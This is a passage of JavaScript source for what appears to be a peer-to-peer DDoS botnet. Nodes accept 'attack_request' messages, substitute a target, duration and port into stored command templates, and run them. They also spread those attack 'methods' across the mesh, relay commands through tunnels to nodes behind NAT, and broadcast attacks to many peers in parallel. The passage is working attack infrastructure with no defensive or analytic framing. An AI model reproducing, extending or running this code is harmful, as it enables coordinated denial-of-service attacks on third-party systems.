            peer.messagesSent++;
            if (selfWelcomeEncrypted.encrypted) {
              this.stats.encryptedMessagesSent++;
            } else {
              this.stats.plainMessagesSent++;
            }
            this.stats.messagesSent++;
          } catch (e) {
            console.error(`[P2P] Failed to send self-welcome to ${nodeId}:`, e.message);
          }

          this.emit('peer_connected', {
            nodeId,
            ip: peerInfo.ip,
            port: normalizedPort,
            mode: peerInfo.mode || 'DIRECT',
            direct: true,
            isOutbound: true
          });

          this.processQueuedMessages(nodeId);

          console.log(`[P2P] Connected to peer ${nodeId} at ${peerInfo.ip}:${normalizedPort} (our mode: ${this.nodeMode})`);
          finish({ success: true, direct: true }, true);
        });

        ws.on('error', (error) => {
          this.stats.connectionFailures++;
          console.log(`[P2P] Failed to connect to ${nodeId}: ${error.message}`);

          if (this.peers.has(nodeId)) {
            finish({ success: true, existing: true }, true);
            return;
          }

          maybeRetry(error.message);
        });
      });

    } catch (error) {
      this.connectionLocks.delete(nodeId);
      this.stats.connectionFailures++;
      console.error(`[P2P] Connection error to ${nodeId}:`, error.message);
      return { success: false, error: error.message };
    }
  }

  // ==========================================================
  // MESSAGE HANDLING
  // ==========================================================

  handlePeerMessage(nodeId, data) {
    try {
      const rawMessage = JSON.parse(data.toString());
      const decrypted = this.decryptMessage(rawMessage);

      if (!decrypted.success) {
        console.error(`[P2P] Failed to decrypt message from ${nodeId}:`, decrypted.error);
        return;
      }

      const message = decrypted.data;

      const peer = this.peers.get(nodeId);
      if (peer) {
        peer.lastSeen = Date.now();
        peer.messagesReceived++;
        if (decrypted.encrypted) {
          peer.encryptedMessages++;
        } else {
          peer.plainMessages++;
        }
      }

      this.stats.messagesReceived++;

      switch (message.type) {
        case 'connection_rejected':
          this.handleConnectionRejected(nodeId, message);
          break;
        case 'welcome':
          this.handleWelcomeMessage(nodeId, message);
          break;
        case 'ping': {
          const pongMessage = { type: 'pong', timestamp: Date.now() };
          const enc = this.encryptMessage(pongMessage, 'pong');
          this.sendToPeer(nodeId, enc.data);
          break;
        }
        case 'pong':
          if (peer) peer.lastHeartbeat = Date.now();
          break;
        case 'attack_request':
          this.handleAttackRequest(nodeId, message, decrypted.encrypted);
          break;
        case 'attack_response':
          this.emit('attack_response', { nodeId, ...message });
          break;
        case 'status_request':
          this.handleStatusRequest(nodeId, message, decrypted.encrypted);
          break;
        case 'status_response':
          this.emit('status_response', { nodeId, ...message });
          break;
        case 'peer_list':
          this.handlePeerListUpdate(message);
          break;
        case 'tunnel_request':
          this.handleTunnelRequest(nodeId, message, decrypted.encrypted);
          break;
        case 'tunnel_response':
          this.handleTunnelResponse(nodeId, message);
          break;
        case 'tunnel_delivery':
          this.handleTunnelDelivery(nodeId, message);
          break;
        case 'peer_reverse_list':
          this.handlePeerReverseList(nodeId, message);
          break;
        case 'relay_request':
          this.handleRelayRequest(nodeId, message, decrypted.encrypted);
          break;
        case 'relay_response':
          this.handleRelayResponse(nodeId, message);
          break;
        case 'methods_version_query':
          this.handleMethodsVersionQuery(nodeId, message, decrypted.encrypted);
          break;
        case 'methods_version_response':
          this.handleMethodsVersionResponse(nodeId, message);
          break;
        case 'methods_request':
          this.handleMethodsRequest(nodeId, message, decrypted.encrypted);
          break;
        case 'methods_response':
          this.handleMethodsResponse(nodeId, message);
          break;
        case 'methods_push':
          this.handleMethodsPush(nodeId, message);
          break;
        case 'methods_update_notification':
          this.handleMethodsUpdateNotification(nodeId, message);
          break;
        case 'file_request':
          this.handleFileRequest(nodeId, message, decrypted.encrypted);
          break;
        case 'file_response':
          this.handleFileResponse(nodeId, message);
          break;
        default:
          console.log(`[P2P] Unknown message type from ${nodeId}: ${message.type}`);
          this.emit('peer_message', { nodeId, message });
      }

    } catch (error) {
      console.error(`[P2P] Failed to handle message from ${nodeId}:`, error.message);
    }
  }

  // ==========================================================
  // TUNNEL SUPPORT
  // ==========================================================

  async sendViaTunnel(targetNodeId, message, messageType = 'tunnel_payload') {
    const tunnelId = crypto.randomBytes(8).toString('hex');

    const tunnelRequest = {
      type: 'tunnel_request',
      tunnelId,
      targetNodeId,
      messageType,
      payload: message,
      sourceNodeId: this.nodeId,
      timestamp: Date.now()
    };

    const knownRelayId = this.knownReversePeers.get(targetNodeId);
    if (knownRelayId && this.peers.has(knownRelayId)) {
      console.log(`[P2P-TUNNEL] Sending to ${targetNodeId} via known relay ${knownRelayId}`);
      return this._requestWithHandler({
        nodeId: knownRelayId,
        requestId: tunnelId,
        eventName: 'tunnel_response',
        handlerKeyPrefix: 'tunnel_response',
        timeoutMs: 15000,
        matchField: 'tunnelId',
        message: tunnelRequest
      });
    }

    const directPeers = Array.from(this.peers.entries())
      .filter(([, peer]) => peer.remoteMode === 'DIRECT' || (!peer.isReverseNode && peer.supportsTunnel !== false))
      .map(([nodeId]) => nodeId);

    if (directPeers.length === 0) {
      return { success: false, error: 'No DIRECT peer available for tunnel' };
    }

    console.log(`[P2P-TUNNEL] Trying ${directPeers.length} DIRECT peer(s) to reach ${targetNodeId}`);

    for (const relayId of directPeers) {
      const result = await this._requestWithHandler({
        nodeId: relayId,
        requestId: crypto.randomBytes(8).toString('hex'),
        eventName: 'tunnel_response',
        handlerKeyPrefix: 'tunnel_response',
        timeoutMs: 8000,
        matchField: 'tunnelId',
        message: { ...tunnelRequest, tunnelId: crypto.randomBytes(8).toString('hex') }
      });

      if (result && result.success) {
        this.knownReversePeers.set(targetNodeId, relayId);
        console.log(`[P2P-TUNNEL] ✓ Found relay: ${relayId} for target ${targetNodeId}`);
        return result;
      }
    }

    return { success: false, error: `No relay found for ${targetNodeId} (tried ${directPeers.length} peers)` };
  }

  handleTunnelRequest(fromNodeId, message, wasEncrypted) {
    const { tunnelId, targetNodeId, payload, messageType, sourceNodeId } = message;

    console.log(`[P2P-TUNNEL] Tunnel request from ${fromNodeId} to ${targetNodeId} (id: ${tunnelId})`);

    const targetWs = this.reversePeers.get(targetNodeId);
    const targetPeer = this.peers.get(targetNodeId);

    if (!targetPeer || !targetWs) {
      const response = {
        type: 'tunnel_response',
        tunnelId,
        success: false,
        error: `Target node ${targetNodeId} not connected to this relay`
      };
      const enc = this.encryptMessage(response, 'tunnel_response');
      this.sendToPeer(fromNodeId, enc.data);
      return;
    }

    const forwardedMsg = {
      type: 'tunnel_delivery',
      tunnelId,
      sourceNodeId,
      relayNodeId: this.nodeId,
      messageType,
      payload,
      timestamp: Date.now()
    };

    const enc = this.encryptMessage(forwardedMsg, 'tunnel_delivery');
    const forwarded = this.sendToPeer(targetNodeId, enc.data);

    this.stats.tunnelMessagesForwarded++;

    const ackResponse = {
      type: 'tunnel_response',
      tunnelId,
      success: forwarded,
      targetNodeId,
      relayNodeId: this.nodeId,
      error: forwarded ? null : 'Failed to forward to target'
    };
    const encAck = this.encryptMessage(ackResponse, 'tunnel_response');
    this.sendToPeer(fromNodeId, encAck.data);

    console.log(`[P2P-TUNNEL] ${forwarded ? '✓' : '✗'} Forwarded tunnel message to ${targetNodeId}`);
  }

  handleTunnelResponse(nodeId, message) {
    this.emit('tunnel_response', { ...message });
  }

  handleTunnelDelivery(fromRelayId, message) {
    const { tunnelId, sourceNodeId, messageType, payload } = message;

    console.log(`[P2P-TUNNEL] Received delivery from ${sourceNodeId} via relay ${fromRelayId} (type: ${messageType})`);

    if (!payload || !messageType) {
      console.warn('[P2P-TUNNEL] Invalid tunnel delivery — missing payload or messageType');
      return;
    }

    this.knownReversePeers.set(sourceNodeId, fromRelayId);

    try {
      const fakeData = Buffer.from(JSON.stringify(payload));
      this.handlePeerMessage(sourceNodeId, fakeData);
    } catch (err) {
      console.error('[P2P-TUNNEL] Error dispatching tunnel delivery:', err.message);
    }
  }

  handlePeerReverseList(fromNodeId, message) {
    const { reverseNodeIds } = message;
    if (!Array.isArray(reverseNodeIds)) return;

    let newEntries = 0;
    for (const reverseId of reverseNodeIds) {
      if (reverseId === this.nodeId) continue;
      if (!this.knownReversePeers.has(reverseId)) {
        newEntries++;
      }
      this.knownReversePeers.set(reverseId, fromNodeId);
    }

    if (newEntries > 0) {
      console.log(`[P2P-TUNNEL] Learned ${newEntries} new REVERSE peer route(s) via ${fromNodeId}`);
    }
  }

  broadcastReverseList() {
    if (this.reversePeers.size === 0) return 0;

    const reverseNodeIds = Array.from(this.reversePeers.keys());
    const message = {
      type: 'peer_reverse_list',
      fromNodeId: this.nodeId,
      reverseNodeIds,
      timestamp: Date.now()
    };

    let sent = 0;
    for (const [peerId] of this.peers) {
      if (!reverseNodeIds.includes(peerId)) {
        const enc = this.encryptMessage(message, 'peer_reverse_list');
        if (this.sendToPeer(peerId, enc.data)) sent++;
      }
    }

    this.stats.reverseListBroadcasts++;
    console.log(`[P2P-TUNNEL] Broadcasted reverse list (${reverseNodeIds.length} REVERSE node(s)) to ${sent} peer(s)`);
    return sent;
  }

  // ==========================================================
  // WELCOME MESSAGE HANDLER
  // ==========================================================

  handleWelcomeMessage(nodeId, message) {
    console.log(`[P2P] Received welcome from ${nodeId} (mode: ${message.mode || 'unknown'})`);

    const peer = this.peers.get(nodeId);
    if (peer) {
      peer.capabilities = message.capabilities;
      peer.remoteMode = message.mode || peer.remoteMode || 'DIRECT';

      if (message.capabilities?.encryption !== undefined) {
        peer.supportsEncryption = message.capabilities.encryption;
      }

      if (message.ip) peer.ip = message.ip;
      if (message.port) peer.port = this.normalizePort(message.port);

      if (message.capabilities) {
        peer.methodsVersion = message.capabilities.methodsVersion;
        peer.methodsCount = message.capabilities.methodsCount || 0;
        peer.supportsTunnel = message.capabilities.tunnel || false;
      }

      const now = Date.now();
      this.knownPeers.set(nodeId, {
        nodeId,
        ip: message.ip || peer.ip,
        port: this.normalizePort(message.port || peer.port),
        mode: message.mode || 'DIRECT',
        reachable: message.mode !== 'REVERSE',
        canConnectTo: message.mode !== 'REVERSE',
        capabilities: message.capabilities,
        methodsVersion: message.capabilities?.methodsVersion,
        methodsCount: message.capabilities?.methodsCount || 0,
        lastUpdate: now,
        supportsEncryption: message.capabilities?.encryption || false
      });

      if (peer.remoteMode === 'DIRECT' && this.nodeMode === 'REVERSE') {
        peer.isRelayProvider = true;
        this.stats.reverseHandshakes++;
        console.log(`[P2P] ✓ Established REVERSE→DIRECT link with ${nodeId} (relay provider)`);
      }

      // FIX: Only query version if peer reports a version AND it differs from ours
      if (this.p2pConfig.preferP2PSync && peer.methodsVersion &&
        peer.methodsVersion !== this.methodsVersionHash) {
        console.log(`[P2P-METHODS] Welcome from ${nodeId} reports different version, querying...`);
        setTimeout(() => this.requestMethodsVersionFromPeer(nodeId), 1000);
      } else if (peer.methodsVersion === this.methodsVersionHash) {
        console.log(`[P2P-METHODS] Welcome from ${nodeId}: version matches (${peer.methodsVersion?.substring(0, 8)}), no sync needed`);
      }
    }

    this.emit('peer_info', {
      nodeId,
      capabilities: message.capabilities,
      mode: message.mode
    });
  }

  // ==========================================================
  // ATTACK HANDLING
  // ==========================================================

  async handleAttackRequest(nodeId, message, wasEncrypted) {
    const { requestId, target, time, port, methods } = message;

    console.log(`[P2P] Attack request from ${nodeId}:`, { target, time, methods });

    try {
      const methodCfg = this.methodsConfig[methods];
      if (!methodCfg) {
        const response = { type: 'attack_response', requestId, success: false, error: 'INVALID_METHOD' };
        const enc = this.encryptMessage(response, 'attack_response');
        this.sendToPeer(nodeId, enc.data);
        return;
      }

      const command = methodCfg.cmd
        .replaceAll('{target}', target)
        .replaceAll('{time}', time)
        .replaceAll('{port}', port);

      const result = await this.executor.execute(command, { expectedDuration: time });

      const response = {
        type: 'attack_response',
        requestId,
        success: true,
        processId: result.processId,
        pid: result.pid,
        target, time, port, methods
      };
      const enc = this.encryptMessage(response, 'attack_response');
      this.sendToPeer(nodeId, enc.data);

    } catch (error) {
      const response = { type: 'attack_response', requestId, success: false, error: error.message };
      const enc = this.encryptMessage(response, 'attack_response');
      this.sendToPeer(nodeId, enc.data);
    }
  }

  async handleStatusRequest(nodeId, message, wasEncrypted) {
    const { requestId } = message;
    try {
      const activeProcesses = this.executor.getActiveProcesses();
      const methods = Object.keys(this.methodsConfig);

      const status = {
        nodeId: this.nodeId,
        mode: this.nodeMode,
        activeProcesses: activeProcesses.length,
        methods,
        methodsVersion: this.methodsVersionHash,
        methodsCount: methods.length,
        peers: this.peers.size,
        reversePeers: this.reversePeers.size,
        uptime: process.uptime(),
        timestamp: Date.now(),
        encryption: this.isEncryptionEnabled()
      };

      const response = { type: 'status_response', requestId, status };
      const enc = this.encryptMessage(response, 'status_response');
      this.sendToPeer(nodeId, enc.data);

    } catch (error) {
      const response = { type: 'status_response', requestId, error: error.message };
      const enc = this.encryptMessage(response, 'status_response');
      this.sendToPeer(nodeId, enc.data);
    }
  }

  // ==========================================================
  // RELAY (legacy)
  // ==========================================================

  async handleRelayRequest(nodeId, message, wasEncrypted) {
    const { relayId, targetNodeId, payload } = message;

    if (this.peers.has(targetNodeId)) {
      const relayedMessage = { type: 'relayed_message', sourceNodeId: nodeId, relayId, payload };
      const enc = this.encryptMessage(relayedMessage, 'relayed_message');
      const success = this.sendToPeer(targetNodeId, enc.data);

      const response = { type: 'relay_response', relayId, success, targetNodeId };
      const encResp = this.encryptMessage(response, 'relay_response');
      this.sendToPeer(nodeId, encResp.data);

      if (success) this.stats.messagesRelayed++;

    } else {
      const response = { type: 'relay_response', relayId, success: false, error: 'Target not connected', targetNodeId };
      const enc = this.encryptMessage(response, 'relay_response');
      this.sendToPeer(nodeId, enc.data);
    }
  }

  handleRelayResponse(nodeId, message) {
    this.emit('relay_response', { relayNodeId: nodeId, ...message });
  }

  // ==========================================================
  // PEER LIST UPDATE
  // ==========================================================

  handlePeerListUpdate(message) {
    const { peers } = message;
    if (!Array.isArray(peers)) return;

    let newPeers = 0;
    const now = Date.now();

    for (const peer of peers) {
      if (!peer.node_id || peer.node_id === this.nodeId) continue;

      const normalizedPort = this.normalizePort(peer.port);
      if (peer.ip === this.nodeIp && normalizedPort === this.nodePort) continue;

      const peerMode = peer.mode || 'DIRECT';
      const existing = this.knownPeers.get(peer.node_id);
      if (!existing) {
        newPeers++;
        this.stats.peersDiscovered++;
      }

      this.knownPeers.set(peer.node_id, {
        nodeId: peer.node_id,
        ip: peer.ip,
        port: normalizedPort,
        mode: peerMode,
        reachable: peer.reachable !== false && peerMode !== 'REVERSE',
        canConnectTo: peerMode !== 'REVERSE',
        methods: peer.methods_supported || [],
        methodsVersion: peer.methods_version,
        methodsCount: peer.methods_count || 0,
        lastUpdate: now
      });
    }

    if (newPeers > 0) {
      console.log(`[P2P-DISCOVERY] Updated: ${newPeers} new peers`);
    }
  }

  // ==========================================================
  // CONNECTION REJECTED HANDLER
  // ==========================================================

  handleConnectionRejected(nodeId, message) {
    const { reason, referrals } = message;
    console.log(`[P2P-REFERRAL] Connection to ${nodeId} rejected: ${reason}`);

    if (!referrals || referrals.length === 0) return;

    this.stats.referralsReceived++;

    const now = Date.now();
    for (const referral of referrals) {
      if (referral.nodeId === this.nodeId) continue;
      if (referral.mode === 'REVERSE') continue;

      const existing = this.knownPeers.get(referral.nodeId);
      if (!existing || existing.lastUpdate < now - 60000) {
        this.knownPeers.set(referral.nodeId, {
          nodeId: referral.nodeId,
          ip: referral.ip,
          port: this.normalizePort(referral.port),
          mode: referral.mode || 'DIRECT',
          reachable: referral.mode !== 'REVERSE',
          canConnectTo: referral.mode !== 'REVERSE',
          capabilities: null,
          methodsVersion: null,
          methodsCount: referral.methodsCount || 0,
          lastUpdate: now,
          fromReferral: true,
          referredBy: nodeId
        });
      }
    }

    if (this.p2pConfig.autoConnect && this.peers.size < this.p2pConfig.maxPeers) {
      setTimeout(() => this.connectToReferralPeers(referrals), 2000);
    }
  }

  async connectToReferralPeers(referrals) {
    if (!referrals || referrals.length === 0) return;

    const availableSlots = this.p2pConfig.maxPeers - this.peers.size - this.connectionLocks.size;
    if (availableSlots <= 0) return;

    let connected = 0;
    for (const referral of referrals) {
      if (connected >= availableSlots) break;
      if (this.peers.has(referral.nodeId) || referral.nodeId === this.nodeId) continue;
      if (this.connectionLocks.has(referral.nodeId)) continue;
      if (referral.mode === 'REVERSE') continue;

      try {
        const result = await this.connectToPeer(referral.nodeId, {
          ip: referral.ip,
          port: referral.port,
          mode: referral.mode || 'DIRECT',
          canConnectTo: true
        });

        if (result.success) {
          connected++;
          this.stats.connectionsViaReferral++;
        }
        await new Promise(r => setTimeout(r, 1000));
      } catch (error) {
        console.error(`[P2P-REFERRAL] Error connecting to ${referral.nodeId}:`, error.message);
      }
    }
  }

  // ==========================================================
  // METHODS SYNC — FIXED TO PREVENT FLOODING
  // ==========================================================

  handleMethodsVersionQuery(nodeId, message, wasEncrypted) {
    const { requestId } = message;
    const response = {
      type: 'methods_version_response',
      requestId,
      nodeId: this.nodeId,
      methodsVersion: this.methodsVersionHash,
      methodsCount: Object.keys(this.methodsConfig).length,
      lastUpdate: this.methodsLastUpdate,
      timestamp: Date.now()
    };
    const enc = this.encryptMessage(response, 'methods_version_response');
    this.sendToPeer(nodeId, enc.data);
  }

  // FIX: Prevent duplicate sync requests when multiple peers report same new version
  handleMethodsVersionResponse(nodeId, message) {
    const { requestId, methodsVersion, methodsCount, lastUpdate } = message;

    const peer = this.peers.get(nodeId);
    if (peer) {
      peer.methodsVersion = methodsVersion;
      peer.methodsCount = methodsCount;
    }

    const kp = this.knownPeers.get(nodeId);
    if (kp) {
      this.knownPeers.set(nodeId, { ...kp, methodsVersion, methodsCount, lastUpdate: Date.now() });
    }

    // FIX: If version matches ours, do nothing — no sync needed
    if (!methodsVersion || methodsVersion === this.methodsVersionHash) {
      if (methodsVersion === this.methodsVersionHash) {
        this.stats.methodSyncSkippedUpToDate++;
        console.log(`[P2P-METHODS] Version response from ${nodeId}: already up-to-date (${methodsVersion?.substring(0, 8)}), skip`);
      }
      this.emit('methods_version_response', { nodeId, requestId, methodsVersion, methodsCount, lastUpdate });
      return;
    }

    // Version differs — check if we should actually request it
    const localCount = Object.keys(this.methodsConfig).length;
    const peerHasMore = methodsCount > localCount;
    const peerIsNewer = lastUpdate && lastUpdate > this.methodsLastUpdate;

    if (!peerHasMore && !peerIsNewer) {
      console.log(`[P2P-METHODS] Peer ${nodeId} has different version but not newer/more, skipping`);
      this.emit('methods_version_response', { nodeId, requestId, methodsVersion, methodsCount, lastUpdate });
      return;
    }

    // FIX: Deduplicate — if we're already requesting this same version, skip
    if (this._pendingMethodsRequestVersion === methodsVersion) {
      this.stats.methodSyncSkippedDuplicate++;
      console.log(`[P2P-METHODS] Already requesting version ${methodsVersion.substring(0, 8)}, skipping duplicate from ${nodeId}`);
      this.emit('methods_version_response', { nodeId, requestId, methodsVersion, methodsCount, lastUpdate });
      return;
    }

    console.log(`[P2P-METHODS] Peer ${nodeId} has newer methods (v${methodsVersion.substring(0, 8)}), requesting...`);
    this._pendingMethodsRequestVersion = methodsVersion;

    this.requestMethodsFromPeer(nodeId)
      .catch(err => console.error('[P2P-METHODS] requestMethodsFromPeer error:', err.message))
      .finally(() => {
        // Clear the pending guard once the request settles
        if (this._pendingMethodsRequestVersion === methodsVersion) {
          this._pendingMethodsRequestVersion = null;
        }
      });

    this.emit('methods_version_response', { nodeId, requestId, methodsVersion, methodsCount, lastUpdate });
  }

  handleMethodsRequest(nodeId, message, wasEncrypted) {
    const { requestId } = message;
    const response = {
      type: 'methods_response',
      requestId,
      nodeId: this.nodeId,
      methods: this.methodsConfig,
      methodsVersion: this.methodsVersionHash,
      methodsCount: Object.keys(this.methodsConfig).length,
      timestamp: Date.now()
    };
    const enc = this.encryptMessage(response, 'methods_response');
    this.sendToPeer(nodeId, enc.data);
    this.stats.filesShared++;
  }

  async handleMethodsResponse(nodeId, message) {
    const { requestId, methods, methodsVersion, methodsCount } = message;

    if (!methods || typeof methods !== 'object') return;

    // FIX: If we already have this version (e.g. received from another peer first), skip
    if (methodsVersion === this.methodsVersionHash) {
      console.log(`[P2P-METHODS] Response from ${nodeId}: version already applied (${methodsVersion?.substring(0, 8)}), skip`);
      this.stats.methodSyncSkippedUpToDate++;
      return;
    }

    try {
      const keys = Object.keys(methods).sort();
      const normalized = JSON.stringify(methods, keys);
      const calculatedHash = crypto.createHash('sha256').update(normalized).digest('hex');

      if (calculatedHash !== methodsVersion) {
        console.error('[P2P-METHODS] Methods version mismatch, rejecting');
        return;
      }

      const normalizedMethods = normalizeMethodsToLocalPaths(methods, this.config);
      if (!normalizedMethods || Object.keys(normalizedMethods).length === 0) return;

      this.methodsConfig = normalizedMethods;
      this.methodsVersionHash = methodsVersion;
      this.methodsLastUpdate = Date.now();
      this.stats.lastMethodSync = Date.now();

      // Clear the pending request guard since we've now received the version
      if (this._pendingMethodsRequestVersion === methodsVersion) {
        this._pendingMethodsRequestVersion = null;
      }

      const peer = this.peers.get(nodeId);
      if (peer) { peer.methodsVersion = methodsVersion; peer.methodsCount = methodsCount; }

      const kp = this.knownPeers.get(nodeId);
      if (kp) this.knownPeers.set(nodeId, { ...kp, methodsVersion, methodsCount, lastUpdate: Date.now() });

      console.log(`[P2P-METHODS] ✓ Updated methods from peer ${nodeId} (v${methodsVersion.substring(0, 8)})`);
      this.stats.methodSyncsFromPeers++;

      this.emit('methods_updated_from_peer', { nodeId, methods: normalizedMethods, methodsVersion, methodsCount, source: 'request_response' });

      // Propagate to other peers (excluding source)
      setImmediate(() => this.propagateMethodsUpdateImmediate(nodeId, methodsVersion, [nodeId]));

    } catch (error) {
      console.error('[P2P-METHODS] Error processing methods from peer:', error.message);
      // Clear pending on error too
      if (this._pendingMethodsRequestVersion === methodsVersion) {
        this._pendingMethodsRequestVersion = null;
      }
    }
  }

  handleMethodsPush(nodeId, message) {
    const { methods, methodsVersion, methodsCount, propagationChain } = message;

    if (Array.isArray(propagationChain)) {
      if (propagationChain.includes(this.nodeId)) return;
      if (propagationChain.length >= this.p2pConfig.maxPropagationHops) return;
    }

    if (!methods || typeof methods !== 'object') return;

    // FIX: Skip if version already matches ours
    if (methodsVersion === this.methodsVersionHash) {
      this.stats.methodSyncSkippedUpToDate++;
      console.log(`[P2P-METHODS] Push from ${nodeId}: already on version ${methodsVersion?.substring(0, 8)}, skip`);
      return;
    }

    try {
      const keys = Object.keys(methods).sort();
      const normalized = JSON.stringify(methods, keys);
      const calculatedHash = crypto.createHash('sha256').update(normalized).digest('hex');

      if (calculatedHash !== methodsVersion) return;

      const normalizedMethods = normalizeMethodsToLocalPaths(methods, this.config);
      if (!normalizedMethods || Object.keys(normalizedMethods).length === 0) return;

      this.methodsConfig = normalizedMethods;
      this.methodsVersionHash = methodsVersion;
      this.methodsLastUpdate = Date.now();
      this.stats.lastMethodSync = Date.now();

      const peer = this.peers.get(nodeId);
      if (peer) { peer.methodsVersion = methodsVersion; peer.methodsCount = methodsCount; }

      const kp = this.knownPeers.get(nodeId);
      if (kp) this.knownPeers.set(nodeId, { ...kp, methodsVersion, methodsCount, lastUpdate: Date.now() });

      console.log(`[P2P-METHODS] ✓ Updated methods from push by ${nodeId} (v${methodsVersion.substring(0, 8)})`);
      this.stats.methodSyncsFromPeers++;

      this.emit('methods_updated_from_peer', { nodeId, methods: normalizedMethods, methodsVersion, methodsCount, source: 'proactive_push' });

      const newChain = propagationChain ? [...propagationChain, this.nodeId] : [nodeId, this.nodeId];
      setImmediate(() => this.propagateMethodsUpdateImmediate(nodeId, methodsVersion, newChain));

    } catch (error) {
      console.error('[P2P-METHODS] Error processing methods push:', error.message);
    }
  }

  // FIX: Early-exit if version already matches ours — prevents unnecessary cascade
  handleMethodsUpdateNotification(nodeId, message) {
    const { methodsVersion, methodsCount, propagationChain } = message;

    if (Array.isArray(propagationChain) && propagationChain.includes(this.nodeId)) return;

    // FIX: If the notified version is already our version, do nothing
    if (!methodsVersion || methodsVersion === this.methodsVersionHash) {
      if (methodsVersion === this.methodsVersionHash) {
        this.stats.methodSyncSkippedUpToDate++;
        console.log(`[P2P-METHODS] Notification from ${nodeId}: version already matches (${methodsVersion?.substring(0, 8)}), skip`);
      }
      return;
    }

    // FIX: Check propagation lock to prevent re-entry from same version
    if (this.methodUpdatePropagationLock.has(methodsVersion)) {
      this.stats.methodSyncSkippedDuplicate++;
      console.log(`[P2P-METHODS] Notification from ${nodeId}: version ${methodsVersion.substring(0, 8)} already being processed, skip`);
      return;
    }

    this.methodUpdatePropagationLock.set(methodsVersion, Date.now());
    setTimeout(() => this.methodUpdatePropagationLock.delete(methodsVersion), this.p2pConfig.propagationCooldown);

    console.log(`[P2P-METHODS] New version detected from ${nodeId} (v${methodsVersion.substring(0, 8)}), requesting...`);

    // FIX: Deduplicate request via pending guard
    if (this._pendingMethodsRequestVersion === methodsVersion) {
      this.stats.methodSyncSkippedDuplicate++;
      console.log(`[P2P-METHODS] Already requesting version ${methodsVersion.substring(0, 8)}, skip notification from ${nodeId}`);
      return;
    }

    this._pendingMethodsRequestVersion = methodsVersion;

    this.requestMethodsFromPeer(nodeId)
      .then(result => {
        if (result && result.success !== false) {
          const newChain = propagationChain ? [...propagationChain, this.nodeId] : [nodeId, this.nodeId];
          this.propagateMethodsUpdateImmediate(nodeId, methodsVersion, newChain);
        }
      })
      .catch(err => {
        console.error('[P2P-METHODS] Failed to sync from peer:', err.message);
      })
      .finally(() => {
        if (this._pendingMethodsRequestVersion === methodsVersion) {
          this._pendingMethodsRequestVersion = null;
        }
      });
  }

  // ==========================================================
  // FILE HANDLING
  // ==========================================================

  handleFileRequest(nodeId, message, wasEncrypted) {
    const { requestId, filename } = message;

    const dataDir = path.join(__dirname, '..', 'lib', 'data');
    const filePath = path.join(dataDir, filename);

    const normalizedPath = path.normalize(filePath);
    const normalizedDataDir = path.normalize(dataDir);
    if (!normalizedPath.startsWith(normalizedDataDir)) {
      const response = { type: 'file_response', requestId, filename, success: false, error: 'Invalid filename' };
      const enc = this.encryptMessage(response, 'file_response');
      this.sendToPeer(nodeId, enc.data);
      return;
    }

    if (!fs.existsSync(normalizedPath)) {
      const response = { type: 'file_response', requestId, filename, success: false, error: 'File not found' };
      const enc = this.encryptMessage(response, 'file_response');
      this.sendToPeer(nodeId, enc.data);
      return;
    }

    try {
      const fileData = fs.readFileSync(normalizedPath);
      const base64Data = fileData.toString('base64');
      const response = { type: 'file_response', requestId, filename, data: base64Data, size: fileData.length, success: true };
      const enc = this.encryptMessage(response, 'file_response');
      this.sendToPeer(nodeId, enc.data);
      this.stats.filesShared++;
    } catch (error) {
      const response = { type: 'file_response', requestId, filename, success: false, error: error.message };
      const enc = this.encryptMessage(response, 'file_response');
      this.sendToPeer(nodeId, enc.data);
    }
  }

  handleFileResponse(nodeId, message) {
    const { requestId, filename, data, success, error } = message;
    if (success && data) {
      this.emit('file_received', { nodeId, requestId, filename, data, size: message.size });
      this.stats.filesReceived++;
    } else {
      console.error(`[P2P-FILE] Failed to receive ${filename}: ${error}`);
    }
  }

  // ==========================================================
  // REQUEST/RESPONSE HELPERS
  // ==========================================================

  async requestMethodsVersionFromPeer(nodeId) {
    const requestId = crypto.randomBytes(8).toString('hex');
    return this._requestWithHandler({
      nodeId, requestId,
      eventName: 'methods_version_response',
      handlerKeyPrefix: 'methods_version_response',
      timeoutMs: 10000,
      message: { type: 'methods_version_query', requestId, timestamp: Date.now() }
    });
  }

  async requestMethodsFromPeer(nodeId) {
    const requestId = crypto.randomBytes(8).toString('hex');
    return this._requestWithHandler({
      nodeId, requestId,
      eventName: 'methods_response',
      handlerKeyPrefix: 'methods_response',
      timeoutMs: 30000,
      message: { type: 'methods_request', requestId, timestamp: Date.now() }
    });
  }

  async requestFileFromPeer(nodeId, filename) {
    const requestId = crypto.randomBytes(8).toString('hex');
    return this._requestWithHandler({
      nodeId, requestId,
      eventName: 'file_received',
      handlerKeyPrefix: 'file_received',
      timeoutMs: 60000,
      message: { type: 'file_request', requestId, filename, timestamp: Date.now() }
    });
  }

  async requestAttackFromPeer(nodeId, target, time, port, methods) {
    const requestId = crypto.randomBytes(8).toString('hex');
    return this._requestWithHandler({
      nodeId, requestId,
      eventName: 'attack_response',
      handlerKeyPrefix: 'attack_response',
      timeoutMs: 30000,
      message: { type: 'attack_request', requestId, target, time, port, methods }
    });
  }

  async requestStatusFromPeer(nodeId) {
    const requestId = crypto.randomBytes(8).toString('hex');
    return this._requestWithHandler({
      nodeId, requestId,
      eventName: 'status_response',
      handlerKeyPrefix: 'status_response',
      timeoutMs: 10000,
      message: { type: 'status_request', requestId }
    });
  }

  _requestWithHandler({ nodeId, requestId, eventName, handlerKeyPrefix, timeoutMs, message, matchField = 'requestId' }) {
    return new Promise((resolve) => {
      let timeoutId = null;
      const handlerKey = `${handlerKeyPrefix}_${requestId}`;

      const cleanup = () => {
        if (timeoutId) { clearTimeout(timeoutId); timeoutId = null; }
        const stored = this.requestHandlers.get(handlerKey);
        if (stored) {
          this.removeListener(eventName, stored.handler);
          this.requestHandlers.delete(handlerKey);
          this.requestHandlerTimestamps.delete(handlerKey);
          this.stats.requestHandlersCleaned++;
        }
      };

      const handler = (data) => {
        if (data[matchField] === requestId) {
          cleanup();
          resolve(data);
        }
      };

      this.requestHandlers.set(handlerKey, { eventName, handler });
      this.requestHandlerTimestamps.set(handlerKey, Date.now());
      this.on(eventName, handler);

      timeoutId = setTimeout(() => {
        cleanup();
        resolve({ success: false, error: 'Timeout' });
      }, timeoutMs);

      const encrypted = this.encryptMessage(message, message.type);
      const sent = this.sendToPeer(nodeId, encrypted.data);
      if (!sent) {
        cleanup();
        resolve({ success: false, error: 'Failed to send request' });
      }
    });
  }

  // ==========================================================
  // BROADCAST ATTACK
  // ==========================================================

  async broadcastAttackRequest({ target, time, port, methods, targetPeerIds = null, maxParallel = 5 }) {
    const directTargets = new Set();
    const tunnelTargets = new Map();

    if (Array.isArray(targetPeerIds) && targetPeerIds.length > 0) {
